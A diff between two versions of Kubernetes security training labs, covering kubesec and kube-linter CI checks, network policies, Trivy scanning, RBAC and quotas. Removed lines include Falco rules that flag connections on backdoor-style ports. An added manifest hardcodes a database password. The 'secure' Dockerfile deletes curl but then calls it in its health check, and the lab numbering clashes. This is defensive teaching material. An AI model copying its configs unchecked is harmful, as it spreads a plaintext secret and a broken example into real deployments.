-        $(jq -r '.Reports[] | select(.Level == "error") | "- " + .Check + ": " + .Message' reports/kube-linter-report.json)
-        
-        ### Warnings
-        $(jq -r '.Reports[] | select(.Level == "warning") | "- " + .Check + ": " + .Message' reports/kube-linter-report.json | head -10)
-        
-        ## Recommendations
-        1. Fix all critical security issues before deployment
-        2. Use specific image tags instead of 'latest'
-        3. Implement proper RBAC and security contexts
-        4. Remove hardcoded secrets from manifests
-        5. Enable security scanning in your deployment pipeline
-        EOF
-        
-    - name: Upload Analysis Reports
-      uses: actions/upload-artifact@v4
-      with:
-        name: security-analysis-reports
-        path: reports/
-        retention-days: 30
-        
-    - name: Comment PR with Results
-      if: github.event_name == 'pull_request'
-      uses: actions/github-script@v7
-      with:
-        script: |
-          const fs = require('fs');
-          const path = 'reports/security-summary.md';
-          
-          if (fs.existsSync(path)) {
-            const report = fs.readFileSync(path, 'utf8');
-            
-            github.rest.issues.createComment({
-              issue_number: context.issue.number,
-              owner: context.repo.owner,
-              repo: context.repo.repo,
-              body: `## 🔒 Security Analysis Results\n\n${report}`
-            });
-          }
-          
-    - name: Fail on Security Issues
-      run: |
-        if [ "$KUBESEC_FAILED" = "true" ] || [ "$KUBELINTER_FAILED" = "true" ] || [ "$IMAGE_TAG_FAILED" = "true" ]; then
-          echo "::error::Security analysis failed. Please fix the issues before proceeding."
-          exit 1
-        fi
-        echo "✅ All security checks passed!"
-EOF
-
-Subtask 4.3: Create Additional Workflow for Secure Manifests
-
-Create a workflow that demonstrates proper security practices.
-
-# Create secure manifests for comparison
-mkdir -p manifests/secure
-
-# Create secure pod manifest
-cat > manifests/secure/secure-pod.yaml << 'EOF'
-apiVersion: v1
-kind: Pod
-metadata:
-  name: secure-app
-  labels:
-    app: secure-app
-  annotations:
-    seccomp.security.alpha.kubernetes.io/pod: runtime/default
-spec:
-  securityContext:
-    runAsNonRoot: true
-    runAsUser: 1000
-    fsGroup: 2000
-    seccompProfile:
-      type: RuntimeDefault
-  containers:
-  - name: app-container
-    image: nginx:1.21.6-alpine
-    ports:
-    - containerPort: 8080
-    securityContext:
-      allowPrivilegeEscalation: false
-      readOnlyRootFilesystem: true
-      runAsNonRoot: true
-      runAsUser: 1000
-      capabilities:
-        drop:
-        - ALL
-        add:
-        - NET_BIND_SERVICE
-    env:
-    - name: SECRET_KEY
-      valueFrom:
-        secretKeyRef:
-          name: app-secrets
-          key: secret-key
-    resources:
-      limits:
-        cpu: 500m
-        memory: 512Mi
-      requests:
-        cpu: 100m
-        memory: 128Mi
-    livenessProbe:
-      httpGet:
-        path: /health
-        port: 8080
-      initialDelaySeconds: 30
-      periodSeconds: 10
-    readinessProbe:
-      httpGet:
-        path: /ready
-        port: 8080
-      initialDelaySeconds: 5
-      periodSeconds: 5
-    volumeMounts:
-    - name: tmp-volume
-      mountPath: /tmp
-    - name: cache-volume
-      mountPath: /var/cache/nginx
-  volumes:
-  - name: tmp-volume
-    emptyDir: {}
-  - name: cache-volume
-    emptyDir: {}
-  serviceAccountName: secure-app-sa
-EOF
-
-# Create secure deployment
-cat > manifests/secure/secure-deployment.yaml << 'EOF'
-apiVersion: apps/v1
-kind: Deployment
-metadata:
-  name: secure-app
-  labels:
-    app: secure-app
-    version: v1.0.0
-spec:
-  replicas: 3
-  strategy:
-    type: RollingUpdate
-    rollingUpdate:
-      maxSurge: 1
-      maxUnavailable: 1
-  selector:
-    matchLabels:
-      app: secure-app
-  template:
-    metadata:
-      labels:
-        app: secure-app
-        version: v1.0.0
-      annotations:
-        seccomp.security.alpha.kubernetes.io/pod: runtime/default
-    spec:
-      securityContext:
-        runAsNonRoot: true
-        runAsUser: 1000
-        fsGroup: 2000
-        seccompProfile:
-          type: RuntimeDefault
-      containers:
-      - name: web-server
-        image: nginx:1.21.6-alpine
-        ports:
-        - containerPort: 8080
-          name: http
-          protocol: TCP
-        securityContext:
-          allowPrivilegeEscalation: false
-          readOnlyRootFilesystem: true
-          runAsNonRoot: true
-          runAsUser: 1000
-          capabilities:
-            drop:
-            - ALL
-            add:
-            - NET_BIND_SERVICE
-        env:
-        - name: DB_PASSWORD
-          valueFrom:
-            secretKeyRef:
-              name: db-secrets
-              key: password
-        - name: API_KEY
-          valueFrom:
-            secretKeyRef:
-              name: api-secrets
-              key: api-key
-        resources:
-          limits:
-            cpu: 500m
-            memory: 512Mi
-          requests:
-            cpu: 100m
-            memory: 128Mi
-        livenessProbe:
-          httpGet:
-            path: /health
-            port: 8080
-          initialDelaySeconds: 30
-          periodSeconds: 10
-        readinessProbe:
-          httpGet:
-            path: /ready
-            port: 8080
-          initialDelaySeconds: 5
-          periodSeconds: 5
-        volumeMounts:
-        - name: tmp-volume
-          mountPath: /tmp
-        - name: cache-volume
-          mountPath: /var/cache/nginx
-      volumes:
-      - name: tmp-volume
-        emptyDir: {}
-      - name: cache-volume
-        emptyDir: {}
-      serviceAccountName: secure-app-sa
-      automountServiceAccountToken: false
-EOF
-
-# Create network policy
-cat > manifests/secure/network-policy.yaml << 'EOF'
-apiVersion: networking.k8s.io/v1
-kind: NetworkPolicy
-metadata:
-  name: secure-app-netpol
-spec:
-  podSelector:
-    matchLabels:
-      app: secure-app
-  policyTypes:
-  - Ingress
-  - Egress
-  ingress:
-  - from:
-    - podSelector:
-        matchLabels:
-          app: frontend
-    ports:
-    - protocol: TCP
-      port: 8080
-  egress:
-  - to:
-    - podSelector:
-        matchLabels:
-          app: database
-    ports:
-    - protocol: TCP
-      port: 5432
-  - to: []
-    ports:
-    - protocol: TCP
-      port: 53
-    - protocol: UDP
-      port: 53
-EOF
-
-Task 5: Test CI/CD Pipeline and Fix Security Issues
-Subtask 5.1: Commit and Push Changes
-
-Push all changes to trigger the CI/CD pipeline.
-
-# Add all new files
-git add .
-
-# Commit changes
-git commit -m "Add GitHub Actions workflow for static analysis and secure manifests"
-
-# Push to trigger pipeline (replace with your repository URL)
-git push origin main
-
-Subtask 5.2: Monitor Pipeline Execution
-
-Check the GitHub Actions workflow execution and analyze results.
-
-# Create a script to check pipeline status
-cat > scripts/check-pipeline-status.sh << 'EOF'
-#!/bin/bash
-
-echo "=== Pipeline Status Check ==="
-echo "Please check your GitHub repository's Actions tab to monitor the pipeline execution."
-echo ""
-echo "Expected pipeline stages:"
-echo "1. ✅ Checkout Code"
-echo "2. ✅ Install Kubesec"
-echo "3. ✅ Install KubeLinter"
-echo "4. ❌ Run Kubesec Analysis (expected to fail)"
-echo "5. ❌ Run KubeLinter Analysis (expected to fail)"
-echo "6. ❌ Image Security Scan (expected to fail)"
-echo "7. ✅ Generate Security Report"
-echo "8. ✅ Upload Analysis Reports"
-echo "9. ❌ Fail on Security Issues (expected to fail)"
-echo ""
-echo "The pipeline should fail due to security issues in the insecure manifests."
-echo "This is expected behavior for this lab."
-EOF
-
-chmod +x scripts/check-pipeline-status.sh
-./scripts/check-pipeline-status.sh
-
-Subtask 5.3: Analyze Security Reports
-
-Download and analyze the security reports generated by the pipeline.
-
-# Create script to analyze local reports
-cat > scripts/analyze-reports.sh << 'EOF'
-#!/bin/bash
-
-echo "=== Security Report Analysis ==="
-
-if [ ! -d "reports" ]; then
-    echo "Reports directory not found. Running local analysis..."
-    ./scripts/run-static-analysis.sh
-fi
-
-echo ""
-echo "=== Kubesec Analysis Results ==="
-for file in reports/kubesec-*-report.json; do
-    if [ -f "$file" ]; then
-        filename=$(basename "$file" -report.json | sed 's/kubesec-//')
-        score=$(jq -r '.[0].score // "N/A"' "$file")
-        echo "File: $filename"
-        echo "Score: $score"
-        
-        # Show critical issues
-        echo "Critical Issues:"
-        jq -r '.[0].scoring.critical[]?.reason // "None"' "$file" | sed 's/^/  - /'
-        
-        # Show advise
-        echo "Recommendations:"
-        jq -r '.[0].scoring.advise[]?.reason // "None"' "$file" | sed 's/^/  - /' | head -3
-        echo ""
-    fi
-done
-
-echo "=== KubeLinter Analysis Results ==="
-if [ -f "reports/kube-linter-report.json" ]; then
-    total_issues=$(jq -r '.Reports | length' reports/kube-linter-report.json)
-    echo "Total Issues: $total_issues"
-    
-    echo ""
-    echo "Critical Issues:"
-    jq -r '.Reports[] | select(.Level == "error") | "  - " + .Check + ": " + .Message' reports/kube-linter-report.json
-    
-    echo ""
-    echo "Top Warnings:"
-    jq -r '.Reports[] | select(.Level == "warning") | "  - " + .Check + ": " + .Message' reports/kube-linter-report.json | head -5
-fi
-
-echo ""
-echo "=== Security Score Summary ==="
-echo "Files with negative Kubesec scores need immediate attention."
-echo "KubeLinter critical issues must be resolved before deployment."
-echo "Review the full reports in the ./reports/ directory for detailed remediation steps."
-EOF
-
-chmod +x scripts/analyze-reports.sh
-./scripts/analyze-reports.sh
-
-Subtask 5.4: Create Fixed Manifests
-
-Create corrected versions of the insecure manifests.
-
-# Create fixed pod manifest
-cat > manifests/fixed-pod.yaml << 'EOF'
-apiVersion: v1
-kind: Pod
-metadata:
-  name: secure-app
-  labels:
-    app: secure-app
-spec:
-  securityContext:
-    runAsNonRoot: true
-    runAsUser: 1000
-    fsGroup: 2000
-  containers:
-  - name: app-container
-    image: nginx:1.21.6-alpine
-    ports:
-    - containerPort: 8080
-    securityContext:
-      allowPrivilegeEscalation: false
-      readOnlyRootFilesystem: true
-      runAsNonRoot: true
-      runAsUser: 1000
-      capabilities:
-        drop:
-        - ALL
-    env:
-    - name: SECRET_KEY
-      valueFrom:
-        secretKeyRef:
-          name: app-secrets
-          key: secret-key
-    resources:
-      limits:
-        cpu: 500m
-        memory: 512Mi
-      requests:
-        cpu: 100m
-        memory: 128Mi
-    volumeMounts:
-    - name: tmp-volume
-      mountPath: /tmp
-  volumes:
-  - name: tmp-volume
-    emptyDir: {}
-EOF
-
-# Create fixed deployment manifest
-cat > manifests/fixed-deployment.yaml << 'EOF'
-apiVersion: apps/v1
-kind: Deployment
-metadata:
-  name: secure-app
-  labels:
-    app: secure-app
-spec:
-  replicas: 3
-  selector:
-    matchLabels:
-      app: secure-app
-  template:
-    metadata:
-      labels:
-        app: secure-app
-    spec:
-      securityContext:
-        runAsNonRoot: true
-        runAsUser: 1000
-        fsGroup: 2000
-      containers:
-      - name: web-server
-        image: nginx:1.21.6-alpine
-        ports:
-        - containerPort: 8080
-        securityContext:
-          allowPrivilegeEscalation: false
-          readOnlyRootFilesystem: true
-          runAsNonRoot: true
-          runAsUser: 1000
-          capabilities:
-            drop:
-            - ALL
-        env:
-        - name: DB_PASSWORD
-          valueFrom:
-            secretKeyRef:
-              name: db-secrets
-              key: password
-        - name: API_KEY
-          valueFrom:
-            secretKeyRef:
-              name: api-secrets
-              key: api-key
-        resources:
-          limits:
-            cpu: 500m
-            memory: 512Mi
-          requests:
-            cpu: 100m
-            memory: 128Mi
-        volumeMounts:
-        - name: tmp-volume
-          mountPath: /tmp
-      volumes:
-      - name: tmp-volume
-        emptyDir: {}
-      serviceAccountName: secure-app-sa
-EOF
-
-# Test the fixed manifests
-echo "Testing fixed manifests..."
-kubesec scan manifests/fixed-pod.yaml
-kubesec scan manifests/fixed-deployment.yaml
-
-kube-linter lint manifests/fixed-pod.yaml
-kube-linter lint manifests/fixed-deployment.yaml
-
-Task 6: Implement Trusted Registry Validation
-Subtask 6.1: Create Registry Validation Script
-
-Create a script to validate container images against trusted registries.
-
-# Create registry validation script
-cat > scripts/validate-registries.sh << 'EOF'
-#!/bin/bash
-
-set -e
-
-# Define trusted registries
-TRUSTED_REGISTRIES=(
-    "gcr.io"
-    "registry.k8s.io"
-    "quay.io"
-    "your-company-registry.com"
-)
-
-# Define allowed base images
-ALLOWED_BASE_IMAGES=(
-    "alpine"
-    "ubuntu"
-    "debian"
-    "nginx"
-    "redis"
-)
-
-echo "=== Container Image Registry Validation ==="
-
-# Function to check if registry is trusted
-is_trusted_registry() {
-    local image=$1
-    local registry=""
-    
-    # Extract registry from image name
-    if [[ "$image" == *"/"* ]]; then
-        registry=$(echo "$image" | cut -d'/' -f1)
-    else
-        registry="docker.io"  # Default registry
-    fi
-    
-    for trusted in "${TRUSTED_REGISTRIES[@]}"; do
-        if [[ "$registry" == "$trusted" ]]; then
-            return 0
-        fi
-    done
-    
-    return 1
-}
-
-# Function to check image tag
-check_image_tag() {
-    local image=$1
-    
-    if [[ "$image" == *":latest" ]] || [[ "$image" != *":"* ]]; then
-        echo "❌ Image $image uses 'latest' tag or no tag specified"
-        return 
-
-
-
-
-
-
-Lab 20: Advanced Network Security Lab
-Objectives
-
-By the end of this lab, students will be able to:
-
-• Deploy and configure Kubernetes Network Policies to control traffic flow between pods and namespaces • Implement monitoring solutions using open-source tools to track network traffic and detect security anomalies • Simulate realistic network attacks against Kubernetes clusters • Validate the effectiveness of security policies through controlled testing • Analyze network traffic patterns to identify potential security threats • Configure advanced network security controls in containerized environments
-Prerequisites
-
-Before starting this lab, students should have:
-
-• Basic understanding of Kubernetes concepts (pods, services, namespaces) • Familiarity with Linux command line operations • Basic networking knowledge (TCP/IP, ports, protocols) • Understanding of YAML configuration files • Knowledge of container security fundamentals
-Lab Environment Setup
-
-Ready-to-Use Cloud Machines: Al Nafi provides pre-configured Linux-based cloud machines with all necessary tools installed. Simply click Start Lab to access your environment - no need to build your own VM or install software.
-
-Your lab environment includes: • Kubernetes cluster (minikube) • kubectl command-line tool • Wireshark for network analysis • Falco for runtime security monitoring • Calico for network policy enforcement • Various penetration testing tools
-Task 1: Deploy and Test Network Policies to Restrict Traffic Flow
-Subtask 1.1: Set Up the Lab Environment
-
-First, let's verify our Kubernetes cluster is running and create the necessary namespaces for our security testing.
-
-# Check cluster status
-kubectl cluster-info
-
-# Create namespaces for our lab
+# Create namespaces
 kubectl create namespace frontend
 kubectl create namespace backend
 kubectl create namespace database
-kubectl create namespace monitoring
 
-# Label namespaces for policy targeting
+# Label namespaces for easy identification
 kubectl label namespace frontend tier=frontend
 kubectl label namespace backend tier=backend
 kubectl label namespace database tier=database
-kubectl label namespace monitoring tier=monitoring
 
-Subtask 1.2: Deploy Sample Applications
+Subtask 2.2: Deploy Test Applications
 
-Create test applications in different namespaces to simulate a multi-tier architecture.
+Deploy applications in each namespace:
 
-# Create frontend application
-cat << EOF | kubectl apply -f -
+# Create file: frontend-app.yaml
+cat << 'EOF' > frontend-app.yaml
 apiVersion: apps/v1
 kind: Deployment
 metadata:
-  name: frontend-app
+  name: frontend
   namespace: frontend
 spec:
   replicas: 2
@@ -13168,7 +8957,7 @@ spec:
     spec:
       containers:
       - name: nginx
-        image: nginx:latest
+        image: nginx:alpine
         ports:
         - containerPort: 80
 ---
@@ -13186,12 +8975,12 @@ spec:
   type: ClusterIP
 EOF
 
-# Create backend application
-cat << EOF | kubectl apply -f -
+# Create file: backend-app.yaml
+cat << 'EOF' > backend-app.yaml
 apiVersion: apps/v1
 kind: Deployment
 metadata:
-  name: backend-app
+  name: backend
   namespace: backend
 spec:
   replicas: 2
@@ -13205,8 +8994,8 @@ spec:
         tier: backend
     spec:
       containers:
-      - name: backend
-        image: httpd:latest
+      - name: httpd
+        image: httpd:alpine
         ports:
         - containerPort: 80
 ---
@@ -13224,12 +9013,12 @@ spec:
   type: ClusterIP
 EOF
 
-# Create database application
-cat << EOF | kubectl apply -f -
+# Create file: database-app.yaml
+cat << 'EOF' > database-app.yaml
 apiVersion: apps/v1
 kind: Deployment
 metadata:
-  name: database-app
+  name: database
   namespace: database
 spec:
   replicas: 1
@@ -13243,13 +9032,13 @@ spec:
         tier: database
     spec:
       containers:
-      - name: mysql
-        image: mysql:8.0
+      - name: postgres
+        image: postgres:alpine
         env:
-        - name: MYSQL_ROOT_PASSWORD
-          value: "securepassword123"
+        - name: POSTGRES_PASSWORD
+          value: "password123"
         ports:
-        - containerPort: 3306
+        - containerPort: 5432
 ---
 apiVersion: v1
 kind: Service
@@ -13260,56 +9049,46 @@ spec:
   selector:
     app: database
   ports:
-  - port: 3306
-    targetPort: 3306
+  - port: 5432
+    targetPort: 5432
   type: ClusterIP
 EOF
 
-Subtask 1.3: Test Initial Connectivity (Before Network Policies)
+Deploy all applications:
 
-Let's verify that all pods can communicate with each other before implementing security policies.
+kubectl apply -f frontend-app.yaml
+kubectl apply -f backend-app.yaml
+kubectl apply -f database-app.yaml
 
-# Get pod information
-kubectl get pods -A -o wide
+Verify deployments:
 
-# Test connectivity from frontend to backend
-FRONTEND_POD=$(kubectl get pods -n frontend -l app=frontend -o jsonpath='{.items[0].metadata.name}')
-BACKEND_IP=$(kubectl get service backend-service -n backend -o jsonpath='{.spec.clusterIP}')
+kubectl get pods -n frontend
+kubectl get pods -n backend
+kubectl get pods -n database
 
-echo "Testing connectivity from frontend to backend..."
-kubectl exec -n frontend $FRONTEND_POD -- curl -s --connect-timeout 5 http://$BACKEND_IP
+Subtask 2.3: Test Initial Connectivity
 
-# Test connectivity from backend to database
-BACKEND_POD=$(kubectl get pods -n backend -l app=backend -o jsonpath='{.items[0].metadata.name}')
-DATABASE_IP=$(kubectl get service database-service -n database -o jsonpath='{.spec.clusterIP}')
+Before applying network policies, test connectivity between namespaces:
 
-echo "Testing connectivity from backend to database..."
-kubectl exec -n backend $BACKEND_POD -- nc -zv $DATABASE_IP 3306
+# Get a frontend pod name
+FRONTEND_POD=$(kubectl get pods -n frontend -o jsonpath='{.items[0].metadata.name}')
 
-Subtask 1.4: Implement Network Policies
+# Test connectivity to backend
+kubectl exec -n frontend $FRONTEND_POD -- wget -qO- --timeout=2 http://backend-service.backend.svc.cluster.local
 
-Now let's create network policies to restrict traffic flow according to security best practices.
+# Test connectivity to database
+kubectl exec -n frontend $FRONTEND_POD -- nc -zv database-service.database.svc.cluster.local 5432
 
-# Create default deny-all policy for database namespace
-cat << EOF | kubectl apply -f -
+Subtask 2.4: Implement Network Policies
+
+Create a network policy to restrict database access:
+
+# Create file: database-network-policy.yaml
+cat << 'EOF' > database-network-policy.yaml
 apiVersion: networking.k8s.io/v1
 kind: NetworkPolicy
 metadata:
-  name: database-deny-all
-  namespace: database
-spec:
-  podSelector: {}
-  policyTypes:
-  - Ingress
-  - Egress
-EOF
-
-# Create policy to allow only backend to access database
-cat << EOF | kubectl apply -f -
-apiVersion: networking.k8s.io/v1
-kind: NetworkPolicy
-metadata:
-  name: database-allow-backend
+  name: database-policy
   namespace: database
 spec:
   podSelector:
@@ -13317,6 +9096,7 @@ spec:
       app: database
   policyTypes:
   - Ingress
+  - Egress
   ingress:
   - from:
     - namespaceSelector:
@@ -13324,11 +9104,15 @@ spec:
           tier: backend
     ports:
     - protocol: TCP
-      port: 3306
+      port: 5432
+  egress:
+  - {}  # Allow all egress traffic
 EOF
 
-# Create policy to restrict backend access
-cat << EOF | kubectl apply -f -
+Create a network policy for backend services:
+
+# Create file: backend-network-policy.yaml
+cat << 'EOF' > backend-network-policy.yaml
 apiVersion: networking.k8s.io/v1
 kind: NetworkPolicy
 metadata:
@@ -13356,323 +9140,2077 @@ spec:
           tier: database
     ports:
     - protocol: TCP
-      port: 3306
-  - to: []
+      port: 5432
+  - to: {}  # Allow DNS resolution
     ports:
     - protocol: UDP
       port: 53
 EOF
 
-Subtask 1.5: Test Network Policy Effectiveness
+Apply the network policies:
 
-Verify that the network policies are working correctly by testing both allowed and blocked connections.
+kubectl apply -f database-network-policy.yaml
+kubectl apply -f backend-network-policy.yaml
 
-# Test allowed connection: frontend to backend
-echo "Testing allowed connection: frontend to backend..."
-kubectl exec -n frontend $FRONTEND_POD -- curl -s --connect-timeout 5 http://$BACKEND_IP
+Subtask 2.5: Test Network Policy Enforcement
 
-# Test blocked connection: frontend to database (should fail)
-echo "Testing blocked connection: frontend to database..."
-kubectl exec -n frontend $FRONTEND_POD -- nc -zv $DATABASE_IP 3306 || echo "Connection blocked as expected"
+Test that the database is now protected:
 
-# Test allowed connection: backend to database
-echo "Testing allowed connection: backend to database..."
-kubectl exec -n backend $BACKEND_POD -- nc -zv $DATABASE_IP 3306
+# This should fail - frontend cannot directly access database
+kubectl exec -n frontend $FRONTEND_POD -- nc -zv database-service.database.svc.cluster.local 5432
 
-# View network policies
-kubectl get networkpolicies -A
+# This should work - frontend can access backend
+kubectl exec -n frontend $FRONTEND_POD -- wget -qO- --timeout=2 http://backend-service.backend.svc.cluster.local
 
-Task 2: Use Monitoring Tools to Track Network Traffic and Detect Anomalies
-Subtask 2.1: Deploy Falco for Runtime Security Monitoring
+# Test from backend to database (should work)
+BACKEND_POD=$(kubectl get pods -n backend -o jsonpath='{.items[0].metadata.name}')
+kubectl exec -n backend $BACKEND_POD -- nc -zv database-service.database.svc.cluster.local 5432
 
-Falco is an open-source runtime security monitoring tool that can detect anomalous behavior in containerized environments.
+Task 3: Container Image Scanning with Trivy
 
-# Add Falco Helm repository
-helm repo add falcosecurity https://falcosecurity.github.io/charts
-helm repo update
+Trivy is an open-source vulnerability scanner for containers and other artifacts.
+Subtask 3.1: Install Trivy
 
-# Install Falco with custom configuration
-cat << EOF > falco-values.yaml
-falco:
-  grpc:
-    enabled: true
-  grpcOutput:
-    enabled: true
-  jsonOutput: true
-  jsonIncludeOutputProperty: true
-  
-driver:
-  kind: ebpf
+Install Trivy on your system:
 
-falcoctl:
-  artifact:
-    install:
-      enabled: true
-    follow:
-      enabled: true
+# Download and install Trivy
+curl -sfL https://raw.githubusercontent.com/aquasecurity/trivy/main/contrib/install.sh | sh -s -- -b /usr/local/bin v0.48.0
 
-services:
-  - name: k8saudit
-    enabled: true
+# Verify installation
+trivy version
+
+Subtask 3.2: Scan Container Images
+
+Scan a container image for vulnerabilities:
+
+# Scan nginx image
+trivy image nginx:latest
+
+# Scan with specific severity levels
+trivy image --severity HIGH,CRITICAL nginx:latest
+
+# Generate JSON report
+trivy image --format json --output nginx-scan.json nginx:latest
+
+Subtask 3.3: Scan Images in Kubernetes
+
+Create a script to scan all images in your cluster:
+
+# Create file: scan-cluster-images.sh
+cat << 'EOF' > scan-cluster-images.sh
+#!/bin/bash
+
+echo "Scanning all container images in the cluster..."
+
+# Get all unique images from all namespaces
+kubectl get pods --all-namespaces -o jsonpath='{range .items[*]}{.spec.containers[*].image}{"\n"}{end}' | sort -u > cluster-images.txt
+
+# Scan each image
+while IFS= read -r image; do
+    echo "Scanning image: $image"
+    trivy image --severity HIGH,CRITICAL --quiet "$image"
+    echo "---"
+done < cluster-images.txt
+
+rm cluster-images.txt
 EOF
 
-# Deploy Falco
-helm install falco falcosecurity/falco -n falco-system --create-namespace -f falco-values.yaml
+chmod +x scan-cluster-images.sh
 
-Subtask 2.2: Configure Custom Falco Rules for Network Monitoring
+Run the cluster image scan:
 
-Create custom rules to detect suspicious network activities.
+./scan-cluster-images.sh
 
-# Create custom Falco rules
-cat << EOF | kubectl apply -f -
+Subtask 3.4: Implement Image Scanning in CI/CD
+
+Create a sample admission controller configuration that would reject images with high vulnerabilities:
+
+# Create file: image-policy.yaml
+cat << 'EOF' > image-policy.yaml
 apiVersion: v1
 kind: ConfigMap
 metadata:
-  name: falco-custom-rules
-  namespace: falco-system
+  name: image-security-policy
+  namespace: kube-system
 data:
-  custom_rules.yaml: |
-    - rule: Suspicious Network Connection
-      desc: Detect connections to suspicious ports
-      condition: >
-        (fd.sport in (1337, 4444, 5555, 6666, 7777, 8888, 9999) or
-         fd.dport in (1337, 4444, 5555, 6666, 7777, 8888, 9999)) and
-        not proc.name in (ssh, sshd)
-      output: >
-        Suspicious network connection detected
-        (user=%user.name command=%proc.cmdline connection=%fd.name)
-      priority: WARNING
-      tags: [network, suspicious]
-    
-    - rule: Unexpected Network Policy Violation
-      desc: Detect attempts to bypass network policies
-      condition: >
-        k8s_audit and
-        ka.verb in (create, update, patch, delete) and
-        ka.target.resource=networkpolicies
-      output: >
-        Network policy modification detected
-        (user=%ka.user.name verb=%ka.verb resource=%ka.target.resource name=%ka.target.name)
-      priority: WARNING
-      tags: [k8s_audit, network_policy]
+  policy.yaml: |
+    apiVersion: v1
+    kind: Policy
+    rules:
+    - name: "scan-images"
+      match:
+      - apiGroups: [""]
+        apiVersions: ["v1"]
+        resources: ["pods"]
+      validate:
+        message: "Images must be scanned and have no HIGH or CRITICAL vulnerabilities"
+        pattern:
+          spec:
+            containers:
+            - name: "*"
+              image: "!*:latest"  # Discourage latest tags
 EOF
 
-Subtask 2.3: Set Up Network Traffic Monitoring with tcpdump
+Subtask 3.5: Create Secure Image Build Process
 
-Monitor network traffic at the node level to capture and analyze packets.
+Create a sample Dockerfile with security best practices:
 
-# Create a monitoring pod with network tools
-cat << EOF | kubectl apply -f -
+# Create file: Dockerfile.secure
+cat << 'EOF' > Dockerfile.secure
+# Use specific version, not latest
+FROM nginx:1.25-alpine
+
+# Create non-root user
+RUN addgroup -g 1001 -S nginx-user && \
+    adduser -u 1001 -D -S -G nginx-user nginx-user
+
+# Remove unnecessary packages and clean cache
+RUN apk del --purge wget curl && \
+    rm -rf /var/cache/apk/*
+
+# Set proper permissions
+RUN chown -R nginx-user:nginx-user /var/cache/nginx && \
+    chown -R nginx-user:nginx-user /var/log/nginx && \
+    chown -R nginx-user:nginx-user /etc/nginx/conf.d
+
+# Use non-root user
+USER nginx-user
+
+# Expose non-privileged port
+EXPOSE 8080
+
+# Health check
+HEALTHCHECK --interval=30s --timeout=3s --start-period=5s --retries=3 \
+  CMD curl -f http://localhost:8080/ || exit 1
+
+CMD ["nginx", "-g", "daemon off;"]
+EOF
+
+Task 4: Additional Security Configurations
+Subtask 4.1: Configure RBAC (Role-Based Access Control)
+
+Create a service account with limited permissions:
+
+# Create file: rbac-config.yaml
+cat << 'EOF' > rbac-config.yaml
 apiVersion: v1
-kind: Pod
+kind: ServiceAccount
 metadata:
-  name: network-monitor
+  name: app-service-account
+  namespace: secure-apps
+---
+apiVersion: rbac.authorization.k8s.io/v1
+kind: Role
+metadata:
+  namespace: secure-apps
+  name: pod-reader
+rules:
+- apiGroups: [""]
+  resources: ["pods"]
+  verbs: ["get", "watch", "list"]
+---
+apiVersion: rbac.authorization.k8s.io/v1
+kind: RoleBinding
+metadata:
+  name: read-pods
+  namespace: secure-apps
+subjects:
+- kind: ServiceAccount
+  name: app-service-account
+  namespace: secure-apps
+roleRef:
+  kind: Role
+  name: pod-reader
+  apiGroup: rbac.authorization.k8s.io
+EOF
+
+Apply RBAC configuration:
+
+kubectl apply -f rbac-config.yaml
+
+Subtask 4.2: Configure Resource Quotas and Limits
+
+Create resource quotas to prevent resource exhaustion:
+
+# Create file: resource-quota.yaml
+cat << 'EOF' > resource-quota.yaml
+apiVersion: v1
+kind: ResourceQuota
+metadata:
+  name: secure-apps-quota
+  namespace: secure-apps
+spec:
+  hard:
+    requests.cpu: "2"
+    requests.memory: 4Gi
+    limits.cpu: "4"
+    limits.memory: 8Gi
+    pods: "10"
+    services: "5"
+---
+apiVersion: v1
+kind: LimitRange
+metadata:
+  name: secure-apps-limits
+  namespace: secure-apps
+spec:
+  limits:
+  - default:
+      cpu: "500m"
+      memory: "512Mi"
+    defaultRequest:
+      cpu: "100m"
+      memory: "128Mi"
+    type: Container
+EOF
+
+Apply resource constraints:
+
+kubectl apply -f resource-quota.yaml
+
+Subtask 4.3: Verify Security Configurations
+
+Check all security configurations:
+
+# Check Pod Security Standards
+kubectl get namespace secure-apps --show-labels
+
+# Check Network Policies
+kubectl get networkpolicies --all-namespaces
+
+# Check RBAC
+kubectl get serviceaccounts -n secure-apps
+kubectl get roles -n secure-apps
+kubectl get rolebindings -n secure-apps
+
+# Check Resource Quotas
+kubectl get resourcequota -n secure-apps
+kubectl describe resourcequota secure-apps-quota -n secure-apps
+
+Troubleshooting Common Issues
+Issue 1: Pod Security Standards Not Working
+
+Problem: Pods are not being blocked by security policies.
+
+Solution:
+
+# Check if Pod Security Admission is enabled
+kubectl api-versions | grep admissionregistration
+
+# Verify namespace labels
+kubectl get namespace secure-apps --show-labels
+
+# Check cluster configuration
+kubectl get nodes -o wide
+
+Issue 2: Network Policies Not Enforcing
+
+Problem: Network policies are not blocking traffic.
+
+Solution:
+
+# Check if your CNI supports Network Policies
+kubectl get pods -n kube-system | grep -E "(calico|cilium|weave)"
+
+# Verify network policy syntax
+kubectl describe networkpolicy database-policy -n database
+
+# Test with verbose output
+kubectl exec -n frontend $FRONTEND_POD -- nc -zv database-service.database.svc.cluster.local 5432
+
+Issue 3: Trivy Scanning Errors
+
+Problem: Trivy fails to scan images.
+
+Solution:
+
+# Update Trivy database
+trivy image --download-db-only
+
+# Check internet connectivity
+curl -I https://github.com
+
+# Scan with debug output
+trivy image --debug nginx:latest
+
+Lab Validation
+
+Verify your lab completion by running these validation commands:
+
+# Check Pod Security Standards
+echo "=== Pod Security Standards ==="
+kubectl get pods -n secure-apps
+kubectl describe pod secure-pod -n secure-apps | grep -A 10 "Security Context"
+
+# Check Network Policies
+echo "=== Network Policies ==="
+kubectl get networkpolicies --all-namespaces
+
+# Check Image Scanning
+echo "=== Image Scanning ==="
+trivy image --severity HIGH,CRITICAL --quiet nginx:alpine | head -10
+
+# Check RBAC
+echo "=== RBAC Configuration ==="
+kubectl auth can-i get pods --as=system:serviceaccount:secure-apps:app-service-account -n secure-apps
+
+# Check Resource Quotas
+echo "=== Resource Quotas ==="
+kubectl describe resourcequota secure-apps-quota -n secure-apps
+
+Conclusion
+
+Congratulations! You have successfully completed Lab 17: Exploring Kubernetes Security Best Practices. In this comprehensive lab, you have:
+
+• Implemented Pod Security Standards to enforce security policies at the pod level, replacing deprecated PodSecurityPolicies with a more modern and flexible approach • Configured Network Policies to control traffic flow between pods and namespaces, implementing a zero-trust network security model • Set up container image vulnerability scanning using Trivy to identify and address security vulnerabilities before deployment • Applied additional security configurations including RBAC, resource quotas, and security contexts
+
+Why This Matters: Security in Kubernetes is not optional—it's essential. As containerized applications become more prevalent in production environments, implementing these security best practices helps protect against:
+
+    Container breakouts and privilege escalation attacks
